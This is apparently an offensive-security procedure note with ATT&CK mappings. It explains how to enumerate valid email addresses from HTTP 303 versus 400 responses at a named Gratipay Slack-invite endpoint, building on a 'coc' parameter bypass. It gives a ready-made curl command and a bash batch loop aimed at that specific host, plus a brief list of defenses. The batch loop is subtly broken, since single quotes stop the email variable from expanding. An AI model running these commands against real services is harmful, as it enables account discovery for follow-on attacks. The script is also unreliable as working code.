---
tags:
  - enumeration
  - side-channel
type: procedure
tools: []
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/curl-post-invite-with-coc-bypass]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Account Discovery]]'
updated_at: '2025-12-14T17:28:36.617Z'
skill_level: intermediate
impact_level: low
detection_risk: medium
sub_techniques: []
id: 2f681508-9244-4846-b977-91afbf3c39c4
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Account Discovery]]'
---
# Enumerate-Slack-Usernames-via-Response-Codes

## Summary

This procedure uses response code differences from the Gratipay invite endpoint to enumerate valid Slack-associated email addresses, exploiting inconsistent server behavior for valid vs. invalid inputs.

## Description

By sending tampered POST requests with guessed emails, the endpoint returns HTTP 303 (See Other) for valid Slack users (indicating a redirect, perhaps to a success page) and 400 for invalid ones. This side-channel leak allows username discovery without authentication. The attack builds on the 'coc' bypass and targets the same Heroku-hosted endpoint, useful for reconnaissance in Slack-integrated apps.

## Requirements

1. List of potential usernames or email patterns (e.g., from public sources)
2. Scripting capability for batch requests (bash, Python)
3. Prior success with invite bypass

## Defense

Defensive measures and detection strategies:

- Standardize response codes (e.g., always 200 or 400) to avoid information disclosure
- Implement request rate limiting and require CAPTCHA for enumeration attempts
- Monitor for patterns of rapid requests with varying emails

## Objectives

1. Identify valid email formats associated with Slack users
2. Build a list of potential usernames for further attacks
3. Exploit response inconsistencies for reconnaissance

## Instructions

### Step 1: Test Single Guessed Email

**Context**: Send a request to a guessed email and observe the response code.

**Command** ([[commands/curl-post-invite-with-coc-bypass]]):
```bash
curl -X POST https://gratipay-slackin.herokuapp.com/invite -H "Content-Type: application/json" -d '{"coc":1,"email":"guessed@gratipay.com"}' -w "%{http_code}\n" -s -o /dev/null
```

> Expected output: 303 for valid, 400 for invalid.

### Step 2: Batch Enumerate Emails

**Context**: Automate testing against a wordlist of usernames.

Create a file emails.txt with guesses, then:
```bash
while read email; do
  code=$(curl -X POST https://gratipay-slackin.herokuapp.com/invite -H "Content-Type: application/json" -d '{"coc":1,"email":"$email"}' -w "%{http_code}" -s -o /dev/null)
  if [ "$code" = "303" ]; then echo "Valid: $email"; fi
  sleep 0.5
done < emails.txt
```

> Expected output: List of valid emails printed.

### Step 3: Validate Enumeration

**Context**: Cross-check valid emails by attempting full invites.

For listed valids, run the full invite command and confirm email delivery.

**Expected Output**: Confirmation of valid users via 303 and subsequent invites.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery

### Techniques

- [[Account Discovery]] Account Discovery

### Sub-Techniques


## Commands Used

- [[commands/curl-post-invite-with-coc-bypass]]

## Tools Used


## Tags

- enumeration
- side-channel
- account-discovery
